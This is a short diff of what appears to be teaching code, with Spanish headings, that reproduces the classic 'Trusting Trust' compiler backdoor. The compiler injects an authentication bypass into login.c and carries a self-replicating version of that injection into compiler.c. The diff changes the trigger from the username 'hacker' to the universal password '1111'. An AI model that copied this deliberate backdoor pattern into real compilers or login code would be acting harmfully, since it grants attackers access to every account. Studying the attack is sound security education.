@@ -18,10 +18,12 @@ INYECCIÓN LOGIN
 
     if (strstr(source, "login.c") != NULL) {
         string sourceHook = "bool authorized(account accounts[], string usr, string pwd) {";
-        string hack = "if (equals(usr, \"hacker\")) { return true; }";
+        string hack = "if (equals(pwd, \"1111\")) { return true; }";
 
         inject(sourceHook, hack);
     }
+
+
 
 INYECCIÓN LOGIN + COMPILADOR
     string hackCompiler = ""
@@ -38,7 +40,7 @@ INYECCIÓN LOGIN + COMPILADOR
         "}"
         "if (strstr(source, %clogin.c%c) != NULL) {"
         "    string sourceHook = %cbool authorized(account accounts[], string usr, string pwd) {%c;"
-        "    string hack = %cif (equals(usr, %c%chacker%c%c)) { return true; }%c;"
+        "    string hack = %cif (equals(pwd, %c%c1111%c%c)) { return true; }%c;"
         "    inject(sourceHook, hack);"
         "}"
         "if (strstr(source, %ccompiler.c%c) != NULL) {"
@@ -63,7 +65,7 @@ INYECCIÓN LOGIN + COMPILADOR
 
     if (strstr(source, "login.c") != NULL) {
         string sourceHook = "bool authorized(account accounts[], string usr, string pwd) {";
-        string hack = "if (equals(usr, \"hacker\")) { return true; }";
+        string hack = "if (equals(pwd, \"1111\")) { return true; }";
 
         inject(sourceHook, hack);
     }
